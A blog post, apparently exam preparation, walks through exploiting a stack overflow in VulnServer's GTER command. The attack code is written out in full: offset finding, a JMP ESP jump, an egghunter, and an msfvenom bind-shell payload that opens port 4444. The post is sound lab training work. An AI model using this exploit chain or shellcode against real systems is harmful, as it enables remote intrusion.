---
layout: post
title:  "[VulnServer] Exploiting GTER Command with Limited Buffer Space Using Egghunter"
date:   2018-06-28
categories: [exploitdev, osceprep]
---

The next command that I tried exploiting was the `GTER` command. Just like in my [previous post](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/27/vulnserver-trun.html), I started fuzzing this command using the following **SPIKE** template.
![GTER Spike](/static/img/03/01.png)

The application crashed when SPIKE sent **around 5000 bytes** of data. To know how the fuzzing was done, please visit my [[previous post]](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/27/vulnserver-trun.html). 

For this exploitation, I used the following skeleton.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

I executed the exploit skeleton to cause a crash and to verify that it’s working. From here, I observed that **EAX** stored the command (`GTER`) and the string sent by the fuzzer (`/.:/ AAAAA…`). **ESP** and **EIP** were also overwritten with the fuzzed string. One thing to note here was that **ESP** was only overwritten with 20 bytes of A’s.
![Crash](/static/img/03/02.png)

To identify the offset that overwrote **EIP**, I used `!mona pc 5000` to create 5000 bytes of unique string that will be used as the buffer.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Executing the updated code caused **EIP** to be overwritten with `41396541`.
![EIP](/static/img/03/03.png)

Using `!mona findmsp`, the data `41396541` was identified with an offset of **147 bytes**.
![Offset](/static/img/03/04.png)

I modified the exploit code again so that **4 B’s** would overwrite **EIP**.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*147
buffer += "BBBB"
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

It did overwrite **EIP** with 4 B’s so the offset was correct. I also observed that **ESP**, which was overwritten with only 20 bytes of C’s, was located right after **EIP**. The buffer of C’s was not enough for a shellcode, which has an average size of 350 bytes.
![4 B's](/static/img/03/05.png)

Before solving the problem with the shellcode space, I first solved the problem with identifying the bad characters. I only had **171 bytes** (147 A’s + 4 B’s + 20 C’s) of buffer space. This was not enough to hold the  255 bytes of characters from `\x01` to `\xFF`. _(Note: The **NULL** character (`\x00`) was already removed.)_ To deal with the limited buffer space, I had to split them into two. I first sent the characters from `\x01` to `\x9F`.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f")
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen, no bad characters was detected from `\x01` to `\x9F`.
![1st Batch](/static/img/03/06.png)

After that, I used the remaining characters `\xA0` to `\xFF`.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = ("\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Again, no bad characters was identified from `\xA0` to `\xFF`. So, the only bad character was the `\x00`.
![2nd Batch](/static/img/03/07.png)

The next thing that I did was identify an address containing a `JMP ESP` instruction so I could redirect the execution of the program to the buffer of C’s. Using `!mona jmp -r esp -m “essfunc.dll”`, the address `0x625011AF` was found.
![JMP ESP](/static/img/03/08.png)

The code was modified again to the following.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*147
buffer += "\xAF\x11\x50\x62"        #JMP ESP 625011AF from essfunc.dll
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

The code worked and **EIP** now points to **ESP**, which contains the buffer of C’s. Again, 20 bytes was not enough to hold a shellcode. By observing the stack, I discovered that the buffer of A’s was located above the buffer of C’s. While the buffer of A’s (147 bytes) was still not enough to host a shellcode, that space would be enough to hold an egghunter.
![Buffer of A's](/static/img/03/09.png)

Before that, I first needed to redirect the program flow to the start of A’s. The buffer of A’s started at `0x00B7F975`, while the buffer of C’s was located at `0x00B7FA0C`. The difference between them was `0xFFFFFF69` (-151 bytes). So, I had to jump back 151 bytes to reach the buffer of A’s.
![Redirection to A's](/static/img/03/10.png)

Using `!mona assemble -s “JMP 0xFFFFFF69”`, I was able to get the equivalent opcode of the instruction `JMP 0xFFFFFF69`. The opcode was good as it didn’t contain a bad character.
![Jump Back](/static/img/03/11.png)

I then modified the exploit code to the following, and executed it.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*147
buffer += "\xAF\x11\x50\x62"        # JMP ESP 625011AF from essfunc.dll
buffer += "\xe9\x64\xff\xff\xff"    # JMP 151 bytes backwards to the start of A's
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

The code worked and I was able to reach the start of A’s.
![Jump Back Worked](/static/img/03/12.png)

Since everything was working according to what I wanted, I then generated an egghunter using `!mona egg -t Capt -cpb "\x00”` with a tag/egg of **Capt**. I also made sure that there will be no bad character from the generated egghunter.
![Egghunter](/static/img/03/13.png)

To verify that everything was working so far, I executed the following code.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

# tag = Capt
# 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = egghunter
buffer += "A"*(147-len(buffer))
buffer += "\xAF\x11\x50\x62"        # JMP ESP 625011AF from essfunc.dll
buffer += "\xe9\x64\xff\xff\xff"    # JMP 151 bytes backwards to the start of A's
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen here, the buffer of A’s was replaced with the egghunter.
![Egghunter Worked](/static/img/03/14.png)

Then I generated a shellcode using the following.
![Shellcode](/static/img/03/15.png)

The only problem left was the location on where to place the shellcode. I didn’t have more than 355 bytes of buffer space to place my shellcode.

![Meme](/static/img/03/16.png)

To solve the problem, I reused the other commands available from vulnserver and hoped that my shellcode would be placed somewhere in memory. It should be noted that I already removed the `GTER` command since it’s the command that I’m exploiting. I also removed the `KSTET` command since it’s causing problem when sending my shellcode using it. To test if my proposed solution would work, I modified the code to the following and executed it.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xdb\xd8\xd9\x74\x24\xf4\x5a\x29\xc9\xbf\xd1\x60\x90\xf9\xb1"
"\x53\x83\xea\xfc\x31\x7a\x13\x03\xab\x73\x72\x0c\xb7\x9c\xf0"
"\xef\x47\x5d\x95\x66\xa2\x6c\x95\x1d\xa7\xdf\x25\x55\xe5\xd3"
"\xce\x3b\x1d\x67\xa2\x93\x12\xc0\x09\xc2\x1d\xd1\x22\x36\x3c"
"\x51\x39\x6b\x9e\x68\xf2\x7e\xdf\xad\xef\x73\x8d\x66\x7b\x21"
"\x21\x02\x31\xfa\xca\x58\xd7\x7a\x2f\x28\xd6\xab\xfe\x22\x81"
"\x6b\x01\xe6\xb9\x25\x19\xeb\x84\xfc\x92\xdf\x73\xff\x72\x2e"
"\x7b\xac\xbb\x9e\x8e\xac\xfc\x19\x71\xdb\xf4\x59\x0c\xdc\xc3"
"\x20\xca\x69\xd7\x83\x99\xca\x33\x35\x4d\x8c\xb0\x39\x3a\xda"
"\x9e\x5d\xbd\x0f\x95\x5a\x36\xae\x79\xeb\x0c\x95\x5d\xb7\xd7"
"\xb4\xc4\x1d\xb9\xc9\x16\xfe\x66\x6c\x5d\x13\x72\x1d\x3c\x7c"
"\xb7\x2c\xbe\x7c\xdf\x27\xcd\x4e\x40\x9c\x59\xe3\x09\x3a\x9e"
"\x04\x20\xfa\x30\xfb\xcb\xfb\x19\x38\x9f\xab\x31\xe9\xa0\x27"
"\xc1\x16\x75\xdd\xc9\xb1\x26\xc0\x34\x01\x97\x44\x96\xea\xfd"
"\x4a\xc9\x0b\xfe\x80\x62\xa3\x03\x2b\x9d\x68\x8d\xcd\xf7\x80"
"\xdb\x46\x6f\x63\x38\x5f\x08\x9c\x6a\xf7\xbe\xd5\x7c\xc0\xc1"
"\xe5\xaa\x66\x55\x6e\xb9\xb2\x44\x71\x94\x92\x11\xe6\x62\x73"
"\x50\x96\x73\x5e\x02\x3b\xe1\x05\xd2\x32\x1a\x92\x85\x13\xec"
"\xeb\x43\x8e\x57\x42\x71\x53\x01\xad\x31\x88\xf2\x30\xb8\x5d"
"\x4e\x17\xaa\x9b\x4f\x13\x9e\x73\x06\xcd\x48\x32\xf0\xbf\x22"
"\xec\xaf\x69\xa2\x69\x9c\xa9\xb4\x75\xc9\x5f\x58\xc7\xa4\x19"
"\x67\xe8\x20\xae\x10\x14\xd1\x51\xcb\x9c\xf1\xb3\xd9\xe8\x99"
"\x6d\x88\x50\xc4\x8d\x67\x96\xf1\x0d\x8d\x67\x06\x0d\xe4\x62"
"\x42\x89\x15\x1f\xdb\x7c\x19\x8c\xdc\x54")

# tag = Capt
# 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = egghunter
buffer += "A"*(147-len(buffer))
buffer += "\xAF\x11\x50\x62"        # JMP ESP 625011AF from essfunc.dll
buffer += "\xe9\x64\xff\xff\xff"    # JMP 151 bytes backwards to the start of A's
buffer += "C"*(5000-len(buffer))

# For loop to send the 2nd stage shellcode using the available commands
for command in ["STATS ", "RTIME ", "LTIME ", "SRUN ", "TRUN ", "GMON ", "GDOG ", "HTER ", "LTER ", "KSTAN "]:
    print "[*]Attempting to store shellcode in " + (command) + " command."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    shell = command + "CaptCapt" + shellcode 
    s.send(shell)
    print s.recv(1024)
    s.close()

# Used to send the 1st stage shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Yay! It worked! As seen here, the egghunter found the string “CaptCapt” right after the `STATS` command.
![Success](/static/img/03/17.png)

The shellcode worked and the target machine opened up a “listening” port on **4444/tcp**.
![Shellcode Worked](/static/img/03/18.png)

The last thing to do was to connect to the newly opened port to have a shell access.
![Shell](/static/img/03/19.png)

I really enjoyed and learned a lot from this exploitation because of the several problems that I encountered along the way. :smile:
